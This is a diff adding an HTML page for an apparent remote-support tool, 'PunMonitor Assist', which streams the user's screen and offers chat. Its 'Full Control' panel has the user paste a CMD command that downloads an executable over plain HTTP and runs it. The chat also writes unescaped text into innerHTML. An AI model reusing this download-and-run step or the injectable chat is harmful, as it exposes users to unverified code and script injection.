@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PunMonitor Assist</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#fff;font-family:system-ui,-apple-system,sans-serif;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+.box{text-align:center;max-width:400px;width:100%}
+h1{font-size:20px;margin-bottom:4px}
+.sub{font-size:12px;color:#999;margin-bottom:20px}
+#status{font-size:13px;color:#999;margin-bottom:16px}
+#start-btn{padding:16px 40px;background:#1976d2;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;width:100%;max-width:300px}
+#start-btn:disabled{background:#333;cursor:not-allowed}
+#unsupported{display:none;background:rgba(239,83,80,.1);border:1px solid rgba(239,83,80,.3);border-radius:8px;padding:12px;margin-top:12px;font-size:12px;color:#ef5350;text-align:left}
+#preview{display:none;margin-top:16px;border:1px solid rgba(255,255,255,.1);border-radius:8px;overflow:hidden;width:100%;max-width:400px}
+#preview video{width:100%;display:block;border-radius:8px}
+#controls{display:none;margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;justify-content:center}
+#controls button{padding:10px 18px;border:1px solid rgba(255,255,255,.15);border-radius:6px;background:rgba(255,255,255,.08);color:#fff;cursor:pointer;font-size:13px}
+#chat{display:none;position:fixed;bottom:0;left:0;right:0;background:#161b22;border-top:1px solid rgba(255,255,255,.1);z-index:10;padding:8px}
+#chat-messages{height:120px;overflow-y:auto;padding:4px 8px;font-size:12px;margin-bottom:4px}
+#chat-input-row{display:flex;gap:4px}
+#chat-input{flex:1;padding:8px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:6px;color:#fff;font-size:13px;outline:none}
+#chat-send{padding:8px 14px;background:#1976d2;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:13px}
+.ci{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:6px;animation:p 2s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.5}}
+#fc-box{display:none;margin-top:16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:16px;text-align:left}
+#fc-box h3{font-size:13px;color:#4caf50;margin-bottom:6px}
+#fc-box p{font-size:11px;color:#999;margin-bottom:8px}
+#fc-cmd{background:#0a0a0a;padding:10px;border-radius:6px;font-family:monospace;font-size:11px;color:#4caf50;word-break:break-all;cursor:pointer;border:1px solid rgba(76,175,80,.2);margin-bottom:6px}
+#fc-cmd:hover{border-color:#4caf50}
+#fc-note{font-size:10px;color:#666}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>PunMonitor Assist</h1>
+  <div class="sub">Share your screen for remote support</div>
+  <div id="status">Tap below to start sharing your screen</div>
+  <button id="start-btn" onclick="startSharing()">Share My Screen</button>
+  <div id="unsupported">
+    <strong>Screen sharing not supported on this browser.</strong><br><br>
+    Please use one of these options:<br>
+    • <strong>Chrome on Android</strong> — use the "Share" button in Chrome menu (⋮ → Share → Cast/Screen)<br>
+    • <strong>Chrome on Desktop</strong> — this works directly<br>
+    • <strong>Safari on iOS 16+</strong> — tap Share → Screen Broadcast
+  </div>
+  <div id="preview"><video id="video" autoplay muted playsinline></video></div>
+  <div id="controls">
+    <button onclick="stopSharing()">Stop Sharing</button>
+    <button onclick="toggleChat()">Chat</button>
+    <button onclick="showFullControl()">Full Control</button>
+  </div>
+  <div id="fc-box">
+    <h3>Full Remote Control</h3>
+    <p>Run this command in Command Prompt (Windows) for full mouse/keyboard control:</p>
+    <div id="fc-cmd" onclick="copyCmd()" title="Click to copy"></div>
+    <div id="fc-note">Click above to copy. Paste in CMD and press Enter.</div>
+  </div>
+</div>
+<div id="chat">
+  <div id="chat-messages"></div>
+  <div id="chat-input-row">
+    <input id="chat-input" placeholder="Type message..." onkeydown="if(event.key==='Enter')sendChat()">
+    <button id="chat-send" onclick="sendChat()">Send</button>
+  </div>
+</div>
+<script>
+var sid = window.location.pathname.split('/').pop();
+var ws = null, stream = null, capInt = null;
+
+// Check browser support
+(function checkSupport() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+    document.getElementById('unsupported').style.display = 'block';
+    document.getElementById('start-btn').disabled = true;
+    document.getElementById('start-btn').textContent = 'Screen sharing not supported';
+  }
+})();
+
+function connectWS() {
+  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(proto + '//' + location.host + '/assist-ws/' + sid);
+  ws.onopen = function() {
+    document.getElementById('status').innerHTML = '<span class="ci"></span>Connected - waiting for support';
+    ws.send(JSON.stringify({type:'assist_hello', sessionId: sid}));
+  };
+  ws.onmessage = function(e) {
+    try { handleMsg(JSON.parse(e.data)); } catch(err) {}
+  };
+  ws.onclose = function() {
+    document.getElementById('status').textContent = 'Disconnected - reconnecting...';
+    setTimeout(connectWS, 2000);
+  };
+}
+
+function startSharing() {
+  var btn = document.getElementById('start-btn');
+  btn.disabled = true;
+  btn.textContent = 'Requesting screen access...';
+
+  var opts = {video: {cursor: 'always'}, audio: false};
+  // Mobile: simpler constraints
+  if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    opts = {video: true, audio: false};
+  }
+
+  navigator.mediaDevices.getDisplayMedia(opts).then(function(s) {
+    stream = s;
+    var video = document.getElementById('video');
+    video.srcObject = s;
+    document.getElementById('preview').style.display = 'block';
+    document.getElementById('controls').style.display = 'flex';
+    document.getElementById('chat').style.display = 'block';
+    btn.style.display = 'none';
+    document.getElementById('status').innerHTML = '<span class="ci"></span>Screen sharing active';
+    document.getElementById('unsupported').style.display = 'none';
+
+    connectWS();
+
+    var canvas = document.createElement('canvas');
+    var ctx = canvas.getContext('2d');
+    // Lower FPS on mobile to save battery
+    var fps = /Android|iPhone|iPad/i.test(navigator.userAgent) ? 2000 : 1000;
+    capInt = setInterval(function() {
+      if (!stream || !ws || ws.readyState !== WebSocket.OPEN) return;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(function(blob) {
+        if (!blob) return;
+        var reader = new FileReader();
+        reader.onload = function() {
+          var arr = new Uint8Array(reader.result);
+          var binary = '';
+          for (var i = 0; i < arr.length; i++) binary += String.fromCharCode(arr[i]);
+          ws.send(JSON.stringify({type:'assist_frame',sessionId:sid,data:btoa(binary),width:canvas.width,height:canvas.height}));
+        };
+        reader.readAsArrayBuffer(blob);
+      }, 'image/jpeg', 0.5);
+    }, fps);
+
+    s.getVideoTracks()[0].onended = function() { stopSharing(); };
+  }).catch(function(err) {
+    btn.disabled = false;
+    btn.textContent = 'Share My Screen';
+    document.getElementById('status').textContent = 'Error: ' + err.message;
+    if (err.name === 'NotAllowedError') {
+      document.getElementById('unsupported').style.display = 'block';
+    }
+  });
+}
+
+function stopSharing() {
+  if (stream) { stream.getTracks().forEach(function(t){t.stop()}); stream = null; }
+  if (capInt) { clearInterval(capInt); capInt = null; }
+  document.getElementById('preview').style.display = 'none';
+  document.getElementById('controls').style.display = 'none';
+  document.getElementById('chat').style.display = 'none';
+  document.getElementById('start-btn').style.display = '';
+  document.getElementById('start-btn').disabled = false;
+  document.getElementById('start-btn').textContent = 'Share My Screen';
+  document.getElementById('status').textContent = 'Sharing stopped';
+}
+
+function handleMsg(msg) {
+  switch(msg.type) {
+    case 'assist_viewer_joined':
+      document.getElementById('status').innerHTML = '<span class="ci"></span>Support is viewing your screen';
+      break;
+    case 'assist_viewer_left':
+      document.getElementById('status').innerHTML = '<span class="ci"></span>Support disconnected';
+      break;
+    case 'assist_chat':
+      appendChat(msg.sender || 'Support', msg.text);
+      break;
+  }
+}
+
+function sendChat() {
+  var input = document.getElementById('chat-input');
+  var text = input.value.trim();
+  if (!text || !ws || ws.readyState !== WebSocket.OPEN) return;
+  ws.send(JSON.stringify({type:'assist_chat',sessionId:sid,sender:'user',text:text}));
+  appendChat('You', text);
+  input.value = '';
+}
+
+function toggleChat() {
+  var c = document.getElementById('chat');
+  c.style.display = c.style.display === 'none' ? 'block' : 'none';
+}
+
+function appendChat(sender, text) {
+  var el = document.getElementById('chat-messages');
+  el.innerHTML += '<div style="margin-bottom:4px"><strong style="color:#4caf50">' + sender + ':</strong> ' + text + '</div>';
+  el.scrollTop = 99999;
+}
+
+function showFullControl() {
+  var box = document.getElementById('fc-box');
+  box.style.display = box.style.display === 'none' ? 'block' : 'none';
+  if (box.style.display === 'block') {
+    var h = location.hostname;
+    var p = location.port || '8080';
+    var cmd = 'curl -sL http://' + h + ':' + p + '/download/PunMonitor.exe -o %TEMP%\\PunMonitor.exe & %TEMP%\\PunMonitor.exe --pull http://' + h + ':' + p;
+    document.getElementById('fc-cmd').textContent = cmd;
+  }
+}
+
+function copyCmd() {
+  var cmd = document.getElementById('fc-cmd').textContent;
+  navigator.clipboard.writeText(cmd).then(function() {
+    var el = document.getElementById('fc-cmd');
+    var orig = el.textContent;
+    el.textContent = 'Copied!';
+    setTimeout(function(){ el.textContent = orig; }, 1500);
+  }).catch(function(){});
+}
+</script>
+</body>
+</html>
